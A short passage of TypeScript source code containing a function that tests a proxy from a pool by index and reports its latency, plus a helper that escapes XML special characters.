export async function testProxy(proxyIndex: number): Promise<{ ok: boolean; latencyMs: number; ip?: string }> {
  const proxies = proxyPool.getAllProxies();
  if (proxyIndex < 0 || proxyIndex >= proxies.length) {
    return { ok: false, latencyMs: 0 };
  }
  return proxyPool.checkProxy(proxies[proxyIndex]);
}

// ═══════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════

function escapeXml(str: string): string {
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}
